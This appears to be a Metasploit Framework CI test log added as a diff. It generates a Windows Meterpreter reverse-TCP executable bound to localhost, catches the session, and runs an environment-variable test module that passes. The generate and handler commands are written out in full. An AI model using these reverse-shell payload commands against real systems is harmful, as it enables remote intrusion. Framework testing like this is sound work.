@@ -1,0 +1,36 @@
+D:/a/metasploit-framework/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/rex-core-0.1.31/lib/rex/compat.rb:381: warning: Win32API is deprecated after Ruby 1.9.1; use fiddle directly instead
+Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
+msf6 > loadpath test/modules
+Loaded 39 modules:
+    14 auxiliary modules
+    13 exploit modules
+    12 post modules
+msf6 > use windows/meterpreter/reverse_tcp
+msf6 payload(windows/meterpreter/reverse_tcp) > irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/windowsmeterpreterreverse_tcp_session_tlv_logging20231026-6224-t5g745txt
+msf6 payload(windows/meterpreter/reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/windowsmeterpreterreverse_tcp_session_tlv_logging20231026-6224-t5g745txt
+msf6 payload(windows/meterpreter/reverse_tcp) > generate -o D:/a/_temp/child-process-rb-windows-meterpreter-reverse-tcp20231026-6224-9981q1.exe -f exe AutoVerifySessionTimeout=30 lport=6001 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/windowsmeterpreterreverse_tcp_debug_log20231026-6224-w14v9jtxt MeterpreterDebugBuild=true
+[*] Writing 73802 bytes to D:/a/_temp/child-process-rb-windows-meterpreter-reverse-tcp20231026-6224-9981q1.exe...
+msf6 payload(windows/meterpreter/reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 0
+msf6 payload(windows/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6001 
+[*] Sending stage (230990 bytes) to 127.0.0.1
+[*] Meterpreter session 1 opened (127.0.0.1:6001 -> 127.0.0.1:49952) at 2023-10-26 19:06:57 +0000
+use test/get_env
+msf6 post(test/get_env) > run session=1 AddEntropy=true Verbose=true
+[*] Running against session 1
+[*] Session type is meterpreter and platform is windows
+[+] should return windows path
+[+] should handle % signs
+[+] should return multiple envs
+[*] Testing complete in 0.23 seconds
+[*] Passed: 3; Failed: 0; Skipped: 0
+[*] Post module execution completed
+msf6 post(test/get_env) > sessions -K
+jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 1 closed.
+msf6 post(test/get_env) > Stopping all jobs...
+msf6 post(test/get_env) > 
